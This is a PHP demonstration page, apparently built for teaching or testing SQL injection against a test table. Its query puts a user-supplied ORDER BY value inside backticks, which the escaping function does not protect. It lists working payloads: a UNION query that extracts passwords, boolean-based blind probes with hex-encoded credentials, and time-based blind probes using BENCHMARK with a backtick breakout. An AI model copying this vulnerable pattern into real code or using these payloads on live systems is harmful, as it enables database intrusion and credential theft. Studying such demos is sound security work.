<?php
    require_once('db.inc.php');
    $order = isset($_GET['o']) ? $_GET['o'] : 'userid';
    $order = mysql_real_escape_string($order);
    RunQuery("SELECT userid, username FROM sql_injection_test ORDER BY `$order`");
?>
<hr><b>Test links:</b><br>
<?php
    
    PrintLink("o=userid");
    PrintLink("o=username");
    PrintLink("o=password");
    PrintLink("o=honey_eaten");
    PrintLink("o='");
    PrintLink("o=userid ASC UNION ALL SELECT username, password FROM sql_injection_test ORDER BY userid");
    PrintLink("o=IF ( (SELECT userid FROM sql_injection_test WHERE username=0x57696e6e6965 AND password=0x506f6f68), userid, username)");
    PrintLink("o=IF ( (SELECT userid FROM sql_injection_test WHERE username=0x57696e6e6965 AND password=0x31323334), userid, username)");
    PrintLink("o=userid`,IF ( (SELECT userid FROM sql_injection_test WHERE username=0x57696e6e6965 AND password=0x506f6f68),  BENCHMARK(300000,MD5(1)), username), `userid");
    PrintLink("o=userid`,IF ( (SELECT userid FROM sql_injection_test WHERE username=0x57696e6e6965 AND password=0x31323334),  BENCHMARK(300000,MD5(1)), username), `userid");
    PrintSource();
?>
